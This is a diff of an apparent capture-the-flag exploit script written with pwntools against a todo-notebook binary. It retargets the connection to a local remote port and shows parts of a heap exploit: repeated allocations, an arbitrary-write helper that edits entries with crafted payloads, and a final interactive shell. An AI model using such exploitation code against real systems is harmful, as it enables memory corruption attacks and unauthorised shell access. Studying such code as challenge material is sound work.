@@ -1,7 +1,6 @@
 from pwn import *
 
-sh = process("./target/debug/definitely_safe_notebook_since_i_have_forbid_unsafe_code")
-#sh = remote("127.0.0.1", 8888)
+sh = remote("127.0.0.1", 12345)
 tob = lambda x: str(x).encode()
 context.arch = 'amd64'
 
@@ -27,7 +26,6 @@ def edit_to_do(index, content):
 def print_todo():
     sh.sendlineafter(b'> ', b'4')
 
-# gdb.attach(sh)
 context.log_level = 'debug'
 for i in range(8):
     add_todo(b'name', 0x10, b'content')
@@ -93,7 +91,5 @@ def arb_write(addr, data):
     ])
     edit_to_do(0x3, payload)
     edit_to_do(0x0, p64(data))
-
-
 
 sh.interactive()
